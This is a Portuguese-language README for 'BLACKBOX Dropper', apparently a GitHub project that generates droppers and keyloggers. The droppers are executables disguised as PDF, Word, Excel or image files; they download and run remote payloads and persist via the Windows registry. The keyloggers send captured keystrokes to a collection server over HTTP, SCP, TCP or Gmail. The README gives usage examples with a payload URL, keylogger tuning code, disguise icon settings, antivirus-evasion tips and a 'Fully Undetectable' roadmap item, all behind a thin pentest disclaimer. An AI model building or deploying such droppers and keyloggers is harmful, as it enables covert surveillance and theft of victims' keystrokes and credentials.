# 🐦‍⬛ BLACKBOX Dropper

**Versão:** v1.0  
**Autor:** [Guilherme Alexander](https://github.com/Guilherme-alexander)  
**Baseado em:** Umbrella Dropper por [Alisson Moretto (4w4k3)](https://github.com/4w4k3)  
**Idioma:** Português-BR

---

## 📋 Sobre

**BLACKBOX Dropper** é uma ferramenta de pentest dedicada a criar **droppers** e **keyloggers** com suporte a múltiplos protocolos de exfiltração de dados.

### 🎯 Funcionalidades Principais

- 📦 **Droppers**: Cria executáveis disfarçados (PDF, WORD, EXCEL, IMAGE)
- 🐝 **HiveServer**: Servidor central para coleta de logs com múltiplos protocolos
- 🔌 **Múltiplos Protocolos**: HTTP, SSH/SCP, TCP Socket e E-mail (Gmail)
- 🖥️ **Cross-Platform**: Funciona no Windows 10/11 e Linux
- 🔒 **Persistência**: Registro automático no Windows
- 🎭 **Disfarce**: Ícones e metadados falsos (Adobe/Microsoft)

---

## ⚠️ AVISO LEGAL

```
"EM NENHUMA HIPÓTESE O DETENTOR DOS DIREITOS AUTORAIS OU COLABORADORES
SERÃO RESPONSÁVEIS POR QUAISQUER DANOS DIRETOS, INDIRETOS, INCIDENTAIS,
ESPECIAIS, EXEMPLARES OU CONSEQUENCIAIS (INCLUINDO, MAS NÃO SE LIMITANDO A,
AQUISIÇÃO DE BENS OU SERVIÇOS SUBSTITUTOS; PERDA DE USO, DADOS OU LUCROS;
OU INTERRUPÇÃO DE NEGÓCIOS) SEJA QUAL FOR A CAUSA E SOB QUALQUER TEORIA DE
RESPONSABILIDADE, SEJA EM CONTRATO, RESPONSABILIDADE ESTRITA OU DELITO
(INCLUINDO NEGLIGÊNCIA OU OUTRA FORMA) DECORRENTE DO USO DESTE SOFTWARE,
MESMO QUE CIENTE DA POSSIBILIDADE DE TAIS DANOS."
```

**🔴 USE ESTA FERRAMENTA APENAS PARA FINS EDUCACIONAIS OU TRABALHO (PENTEST)!**

---

## 🚀 Novidades

### v1.0 - HiveServer Integration

- 🐝 **HiveServer**: Servidor central para coleta de logs
- 🔌 **Múltiplos Protocolos**:
  - 🌐 **HTTP/HTTPS**: Servidor web com endpoint `/log`
  - 🔒 **SSH/SCP**: Envio para servidor remoto (Windows/Linux)
  - 📡 **TCP Socket**: Comunicação direta via sockets
  - ✉️ **E-mail**: Envio via Gmail SMTP
- 🎨 **Interface Melhorada**: Cores em branco, amarelo e vermelho
- 🖥️ **Cross-Platform Total**: Windows 10/11 e Linux
- 📦 **Instaladores**: Scripts para Windows (BAT/PS1) e Linux (SH)
- 📚 **Documentação Completa**: README e AUTHOR atualizados

---

## 📦 Dependências

### Linux (Ubuntu/Debian/Kali):

```bash
# Instalar dependências do sistema
sudo apt update
sudo apt install -y wine wget python3 python3-pip

# Instalar PyInstaller para Python 3
pip3 install pyinstaller

# Instalar Python 2.7 no Wine (para compilação)
wget https://www.python.org/ftp/python/2.7.18/python-2.7.18.msi
wine msiexec /i python-2.7.18.msi /quiet

# Instalar PyInstaller no Wine
wine /root/.wine/drive_c/Python27/python.exe -m pip install pyinstaller
```

### Windows 10/11:

```powershell
# Instalar Python 3 (baixar de python.org)
# Instalar PyInstaller
pip install pyinstaller

# Para SSH (opcional): instalar OpenSSH Client
# Já vem instalado no Windows 10/11
```

---

## 🔧 Instalação

### 📥 Clonar o Repositório

```bash
git clone https://github.com/Guilherme-alexander/BLACKBOX.git
cd BLACKBOX
```

### 🐧 Linux

```bash
# Dar permissão de execução
chmod +x main.py HiveServer.py

# Executar o instalador (recomendado)
sudo ./install.sh

# Ou executar diretamente
sudo python3 main.py
```

### 🪟 Windows

```cmd
# Executar o instalador (recomendado)
install.bat

# Ou via PowerShell (como administrador)
.\install.ps1

# Executar
python main.py
```

---

## 📂 Estrutura do Projeto

```
BLACKBOX/
│
├── main.py                 # Script principal (Python 3)
├── HiveServer.py           # Servidor central de logs
├── README.md               # Documentação principal
├── AUTHOR.md               # Informações do autor
├── LICENSE                 # Licença BSD-3-Clause
│
├── install.bat             # Instalador Windows (BAT)
├── install.ps1             # Instalador Windows (PowerShell)
├── install.sh              # Instalador Linux
│
├── dist/                   # Droppers gerados (saída)
├── hive_logs/              # Logs coletados pelo HiveServer
│
├── Icons/                  # Ícones para disfarce
│   ├── pdf.ico
│   ├── word.ico
│   ├── excel.ico
│   ├── img.ico
│   ├── flash.ico
│   ├── acrobat.ico
│   └── powerpoint.ico
│
├── Manifest/
│   └── manifest.manifest   # Manifesto do Windows
│
├── Resource/               # Metadados
│   ├── pdf.template
│   ├── word.template
│   ├── excel.template
│   ├── adobe.template
│   ├── acrobat.template
│   └── powerpoint.template
│
└── Templates/
    ├── Bee.py              # Template do Keylogger
    └── U_dRoP.py           # Template do Dropper
```

---

## 🎮 Como Usar

### 🏠 Menu Principal

Ao executar o BLACKBOX, você verá:

```

     ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗
     ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝
     ██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║ ╚███╔╝
     ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║ ██╔██╗
     ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██╔╝ ██╗
     ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝

                        🔒 DROPPER & KEYLOGGER SUITE 🔒

    ┌─────────────────────────────────────────────────────────────────┐
    │                                                                 │
    │  ▶  [1]  Gerar Dropper                                          │
    │  ▶  [2]  KeyLogger HiveServer                                   │
    │  ▶  [3]  Ajuda / Documentação                                   │
    │  ▶  [0]  Sair                                                   │
    │                                                                 │
    └─────────────────────────────────────────────────────────────────┘

    by: Guilherme Alexander • https://github.com/Guilherme-alexander
    version: 1.0  •  ⬛‍ BLACKBOX  •  🐝 Hive

┌─[ BLACKBOX ]─[ Escolha uma opção ]
└╼>
```

### 📦 Opção 1: Gerar Dropper

Cria executáveis disfarçados que baixam e executam payloads:

```
    ┌─────────────────────────────────────────────────────┐
    │                📦 TIPOS DE DROPPER                  │
    ├─────────────────────────────────────────────────────┤
    │                                                     │
    │     [1]  PDF DROPPER     (PDF + EXE)                │
    │     [2]  WORD DROPPER    (DOCX + EXE)               │
    │     [3]  EXCEL DROPPER   (XLSX + EXE)               │
    │     [4]  IMAGE DROPPER   (JPG/PNG + EXE)            │
    │                                                     │
    │     [0]  Voltar ao menu principal                   │
    │                                                     │
    └─────────────────────────────────────────────────────┘

┌─[ DROPPER ]─[ Selecione o tipo ]─
└╼>
```

**Exemplo de Uso:**
```bash
BLACKBOX >> 1

📥 URL do EXE para baixar: http://192.168.1.100/payload.exe
📄 URL do arquivo para embutir: http://192.168.1.100/documento.pdf

[*] Construindo dropper...
✅ Dropper salvo em: dist/Blackbox_Pdf_.pdf.exe
```

### 🐝 Opção 2: HiveServer

Servidor central para coleta de logs com múltiplos protocolos:

```
    ╔════════════════════════════════════════════════════════════╗
    ║                      🐝 HIVE SERVER                        ║
    ║                 Servidor Central BLACKBOX                  ║
    ║            https://github.com/Guilherme-alexander          ║
    ╚════════════════════════════════════════════════════════════╝
    ╔════════════════════════════════════════════════════════════╗
    ║  [1] Iniciar Servidor                                      ║
    ║  [2] Configurar Protocolos                                 ║
    ║  [3] Gerar KeyLogger                                       ║
    ║  [4] Visualizar Logs                                       ║
    ║  [5] Limpar Logs                                           ║
    ║  [0] Voltar ao BLACKBOX                                    ║
    ╚════════════════════════════════════════════════════════════╝

 [+] HIVE (🐝) >>
```

#### 🔌 Configurar Protocolos (Opção 2)

Selecione os protocolos que deseja usar:

```
╔════════════════════════════════════════════════════════════╗
║           SELECIONE OS PROTOCOLOS ATIVOS                   ║
╠════════════════════════════════════════════════════════════╣
║  [1] HTTP/HTTPS   (Servidor Web)                           ║
║  [2] SSH/SCP      (Envio para servidor remoto)             ║
║  [3] TCP Socket   (Conexão TCP pura)                       ║
║  [4] E-mail       (Gmail)                                  ║
║  [0] Continuar                                             ║
╚════════════════════════════════════════════════════════════╝
```

**Configuração SSH:**
```
🌐 Host SSH (ex: 192.168.1.100): 192.168.1.100
👤 Usuário SSH: root
🔑 Usar chave SSH? (s/N): s
📁 Caminho da chave privada: ~/.ssh/id_rsa
🔌 Porta SSH (Enter para 22): 22
📁 Caminho remoto (Enter para /var/log/hive/): /var/log/hive/
```

**Configuração TCP:**
```
🔌 Porta TCP (Enter para 9999): 9999
```

**Configuração E-mail:**
```
📧 E-mail Gmail: seu_email@gmail.com
🔑 Senha do Gmail: ********
```

#### 🎯 Gerar KeyLogger (Opção 3)

Gera um keylogger com as configurações dos protocolos ativos:

```
╔════════════════════════════════════════════════════════════╗
║           SELECIONE O TIPO DE KEYLOGGER                    ║
╠════════════════════════════════════════════════════════════╣
║  [1] Adobe Flash Update   (Ícone Flash)                    ║
║  [2] Fake Word docx      (Ícone Word)                      ║
║  [3] Fake Excel xlsx     (Ícone Excel)                     ║
║  [4] Fake Powerpoint pptx (Ícone PowerPoint)               ║
║  [5] Fake Acrobat pdf   (Ícone PDF)                        ║
║  [6] Blank Executable   (Sem ícone)                        ║
╚════════════════════════════════════════════════════════════╝
```

---

## 🔌 Protocolos do HiveServer

### 🌐 HTTP/HTTPS
- **Endpoint:** `POST /log`
- **Formato:** JSON
- **Exemplo:**
```json
{
    "hostname": "PC-ALVO",
    "data": "logs do teclado...",
    "timestamp": "2026-09-01T10:30:00"
}
```

### 🔒 SSH/SCP
- **Método:** SCP (cópia segura)
- **Suporte:** Windows (OpenSSH/Git Bash) e Linux
- **Autenticação:** Senha ou Chave SSH
- **Local:** Diretório configurado no servidor remoto

### 📡 TCP Socket
- **Porta:** Configurável (padrão 9999)
- **Formato:** Texto puro
- **Exemplo:** `[HOSTNAME] TIMESTAMP\nlogs...`

### ✉️ E-mail (Gmail)
- **SMTP:** smtp.gmail.com:587
- **TLS:** StartTLS
- **Formato:** E-mail com anexo de texto

---

## 🎨 Interface do HiveServer

### 📊 Visualizar Logs (Opção 4)

```
╔════════════════════════════════════════════════════════════╗
║                    VISUALIZAR LOGS                         ║
╚════════════════════════════════════════════════════════════╝

Arquivos de log disponíveis:

  [1] PC-ALVO_192.168.1.100.log (2.3 KB)
  [2] PC-TESTE_192.168.1.101.log (1.1 KB)

Selecione um arquivo (0 para voltar): 1
```

### 🧹 Limpar Logs (Opção 5)

```
[!] Tem certeza que deseja limpar todos os logs? (s/N): s
[+] Logs limpos!
```

---

## 🛠️ Personalização

### 📝 Alterar Template do Keylogger

Edite `Templates/Bee.py` para modificar o comportamento do keylogger:

```python
# Alterar intervalo de envio (padrão 120 segundos)
sleep(60)  # Envia a cada 60 segundos

# Alterar tamanho mínimo do buffer (padrão 30 caracteres)
if len(data_buffer) > 50:  # Envia com 50+ caracteres

# Adicionar novas teclas especiais
keys = {
    13: ' [ENTER] ',
    # Adicione mais teclas aqui
}
```

### 🎭 Adicionar Novos Ícones

1. Coloque arquivos `.ico` em `Icons/`
2. Atualize `main.py` ou `HiveServer.py` com as novas configurações

```python
# Exemplo em HiveServer.py
configs = {
    '7': {
        'version': 'Resource/novo.template',
        'icon': 'Icons/novo.ico',
        'name': 'Bee_Novo_.exe',
        'manifest': '--manifest=Manifest/manifest.manifest',
        'desc': 'Novo Tipo'
    }
}
```

---

## 🧪 Testado em

### 🐧 Sistemas de Desenvolvimento (Linux)
- ✅ Kali Linux (ROLLING)
- ✅ Ubuntu 20.04 LTS / 22.04 LTS
- ✅ Debian 10/11
- ✅ Linux Mint 20/21

### 🪟 Sistemas Alvo (Windows)
- ✅ Windows 7 (x86/x64)
- ✅ Windows 8.1 (x86/x64)
- ✅ Windows 10 (x86/x64)
- ✅ Windows 11 (x64)

---

## ❓ Perguntas Frequentes

### Por que Python 2.7 no Wine?

O **BLACKBOX Dropper** usa Python 3 para rodar (`main.py`), mas a compilação de executáveis Windows via Wine no Linux requer Python 2.7 porque o PyInstaller via Wine tem melhor compatibilidade com Python 2.7.

**Resumo:**
- 🐍 **Sistema host**: Python 3 (para rodar o BLACKBOX)
- 🍷 **Wine**: Python 2.7 (para compilar os droppers .exe)
- 📦 **Template**: Compatível com ambas as versões

### Como o keylogger envia logs?

O keylogger suporta múltiplos protocolos configuráveis:

1. **HTTP**: Envia JSON para o servidor web
2. **SSH/SCP**: Envia arquivos via SCP
3. **TCP**: Envia texto via socket TCP
4. **E-mail**: Envia via Gmail SMTP

### O dropper funciona com antivírus?

O BLACKBOX usa técnicas básicas de evasão, mas antivírus modernos podem detectar. Para testes mais avançados:

- Ofuscação de código
- Empacotamento (packing)
- Assinatura digital
- Técnicas de evasão de sandbox

### Como fazer o dropper persistir?

O dropper já tem persistência via registro do Windows. Para modificar:

```python
# Em Templates/U_dRoP.py
dir = "C:\\Users\\Public\\Libraries\\Intel\\" + nameem
# O dropper se copia para este diretório
```

---

## 🔒 Segurança e Ética

- ✅ **Use apenas em ambientes autorizados**
- ✅ **Mantenha em VMs isoladas**
- ✅ **Nunca compartilhe os droppers gerados publicamente**
- ✅ **Documente todos os testes realizados**
- ✅ **Obtenha autorização por escrito antes de qualquer teste**

---

## 📄 Licença

Este projeto é licenciado sob a licença **BSD-3-Clause** - veja o arquivo [LICENSE](LICENSE) para detalhes.

---

## 🙏 Agradecimentos

- [Alisson Moretto (4w4k3)](https://github.com/4w4k3) - Criador do Umbrella Dropper
- Comunidade de Pentest e Segurança da Informação
- Contribuidores e testadores

---

## 📧 Contato

- **GitHub:** [https://github.com/Guilherme-alexander](https://github.com/Guilherme-alexander)
- **Projeto Original:** [Umbrella Dropper](https://github.com/4w4k3/Umbrella)
- **🐝 HiveServer:** Servidor central integrado

---

## ⭐ Considerações Finais

**BLACKBOX Dropper** é uma ferramenta poderosa para testes de penetração, com grande poder vem grande responsabilidade.

> *"Um espírito nobre engrandece o menor dos homens"*

**🐦‍⬛ BLACKBOX Dropper • 🐝 HiveServer • 🔒 Security**

---

## 📊 Roadmap

- [ ] Suporte a TLS/SSL no servidor HTTP
- [ ] Interface web para visualização de logs
- [ ] Banco de dados SQLite para logs
- [ ] Suporte a Telegram/Webhook
- [ ] Ofuscação automática de código
- [ ] FUD (Fully Undetectable) techniques
- [ ] Suporte a macOS

---

**Versão:** v1.0  
**Última Atualização:** Setembro 2026  
**Autor:** Guilherme Alexander

```bash
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║     🌟 OBRIGADO POR USAR O BLACKBOX DROPPER!                      ║
║                                                                   ║
║     🔗 https://github.com/Guilherme-alexander                     ║
║                                                                   ║
║     🐝 HiveServer  •  🐦‍⬛ BLACKBOX  •  🔒 Security              ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```
